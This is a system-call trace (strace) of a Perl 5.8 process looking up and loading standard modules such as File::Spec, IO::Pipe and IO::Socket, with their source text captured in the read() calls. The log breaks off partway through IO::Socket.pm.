12268 07:41:34.914773 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914785 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914799 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914811 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914825 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914837 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914850 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914862 stat64("/usr/share/perl5/File/Spec.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914875 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914887 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914900 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.914913 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
12268 07:41:34.914933 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.914948 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.914959 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.914976 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
12268 07:41:34.915135 stat64("/etc/perl/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915160 stat64("/etc/perl/vars.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915173 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915186 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915199 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915212 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915226 stat64("/usr/lib/perl5/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915238 stat64("/usr/lib/perl5/vars.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915250 stat64("/usr/share/perl5/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915262 stat64("/usr/share/perl5/vars.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915275 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915286 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf9bfccc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915300 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf9bfdbc) = -1 ENOENT (No such file or directory)
12268 07:41:34.915312 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
12268 07:41:34.915332 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
12268 07:41:34.915345 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bfad8) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.915356 _llseek(10, 0, [0], SEEK_CUR) = 0
12268 07:41:34.915373 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
12268 07:41:34.915483 stat64("/etc/perl/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915497 stat64("/etc/perl/warnings/register.pm", 0xbf9bf81c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915543 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915557 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf9bf81c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915588 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915601 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf9bf81c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915619 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915631 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf9bf81c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915644 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915656 stat64("/usr/share/perl5/warnings/register.pm", 0xbf9bf81c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915670 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915682 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf9bf81c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915696 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf9bf90c) = -1 ENOENT (No such file or directory)
12268 07:41:34.915709 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
12268 07:41:34.915730 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
12268 07:41:34.915744 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bf628) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.915755 _llseek(11, 0, [0], SEEK_CUR) = 0
12268 07:41:34.915773 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
12268 07:41:34.915916 read(11, "", 4096) = 0
12268 07:41:34.915929 close(11)         = 0
12268 07:41:34.916174 _llseek(10, 1148, [1148], SEEK_SET) = 0
12268 07:41:34.916191 _llseek(10, 0, [1148], SEEK_CUR) = 0
12268 07:41:34.916201 close(10)         = 0
12268 07:41:34.916268 _llseek(8, 594, [594], SEEK_SET) = 0
12268 07:41:34.916282 _llseek(8, 0, [594], SEEK_CUR) = 0
12268 07:41:34.916291 close(8)          = 0
12268 07:41:34.916324 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916339 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916352 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916365 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916379 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916392 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916406 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916418 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916431 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916443 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916456 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916469 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf9c017c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916483 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf9c026c) = -1 ENOENT (No such file or directory)
12268 07:41:34.916510 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
12268 07:41:34.916563 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
12268 07:41:34.916595 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9bff88) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.916607 _llseek(8, 0, [0], SEEK_CUR) = 0
12268 07:41:34.916625 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
12268 07:41:34.917381 brk(0x8218000)    = 0x8218000
12268 07:41:34.917510 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
12268 07:41:34.917943 read(8, "", 4096) = 0
12268 07:41:34.917958 close(8)          = 0
12268 07:41:34.918204 read(6, "", 4096) = 0
12268 07:41:34.918220 close(6)          = 0
12268 07:41:34.918382 stat64("/etc/perl/IO/Pipe.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918402 stat64("/etc/perl/IO/Pipe.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918416 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918429 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918443 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918455 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918469 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918480 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918493 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918504 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918517 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.918529 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
12268 07:41:34.918550 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.918574 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.918588 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.918635 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
12268 07:41:34.919347 _llseek(6, 3425, [3425], SEEK_SET) = 0
12268 07:41:34.919365 _llseek(6, 0, [3425], SEEK_CUR) = 0
12268 07:41:34.919376 close(6)          = 0
12268 07:41:34.919399 stat64("/etc/perl/IO/Socket.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919413 stat64("/etc/perl/IO/Socket.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919426 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919439 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919453 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919465 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919479 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919491 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919504 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919515 stat64("/usr/share/perl5/IO/Socket.pm", 0xbf9c062c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919528 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbf9c071c) = -1 ENOENT (No such file or directory)
12268 07:41:34.919541 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
12268 07:41:34.919571 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
12268 07:41:34.919613 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c0438) = -1 ENOTTY (Inappropriate ioctl for device)
12268 07:41:34.919639 _llseek(6, 0, [0], SEEK_CUR) = 0
12268 07:41:34.919657 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, 